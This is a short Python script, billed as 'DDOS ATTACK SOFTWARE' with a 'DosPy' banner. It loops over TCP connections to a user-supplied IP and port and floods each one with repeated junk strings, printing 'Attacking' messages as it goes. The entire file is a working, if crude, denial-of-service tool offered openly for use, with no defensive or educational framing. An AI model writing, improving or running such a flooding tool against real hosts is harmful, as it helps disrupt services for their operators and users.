import time,socket,argparse
from platform import system
import os
def Start_attack(input_ip,input_port):
	if system() == 'Linux':
		os.system('clear')
	elif system() == 'Windows':
		os.system('cls')
		os.system('color a')
	__version__ = '1.1'
	Date_and_time_of_day = 'Time of day : '+time.ctime()
	The_developer_team = 'Arab Python'
	banner = """
								 """+__version__ +"""
	
								 """+Date_and_time_of_day+"""
	 _____            _____       
	|  __ \          |  __ \     """+The_developer_team+"""
	| |  | | ___  ___| |__) |   _ 
	| |  | |/ _ \/ __|  ___/ | | |
	| |__| | (_) \__ \ |   | |_| |
	|_____/ \___/|___/_|    \__, |
							 __/ |
							|___/ 
	
	"""
	print(banner)
	# input_ip = str(input('Enter IP Address Plase :'))
	# input_port = input('\nEnter port open Plase :')
	print("-"*30)
	print("The attack on the site started please. If you want to stop, press Ctrl+C")
	print("-"*30)
	try:
		while True:
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			connect = sock.connect((input_ip,input_port))
			data = 'abcdefghjiklmnopqrstydlfkjlsfmlsmflsdmfldsmfklmsflsklfjsklfklsdfnmjsknrdklae'*1000
			time.sleep(1)
			sock.send(data.encode('utf-8'))
			print ("Attacking for ip address ",input_ip,"port is ",input_port)
	except socket.error as err:
		raise err
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDOS ATTACK SOFTWARE')
    parser.add_argument('-d', metavar='ip', type=str, help='Host ip ')
    parser.add_argument('-p', metavar='PORT', type=int, default=22555, help='Port Number')
    args = parser.parse_args()
    if args.d != None:
        Start_attack(args.d, args.p)
    else:
        print('Error argument')




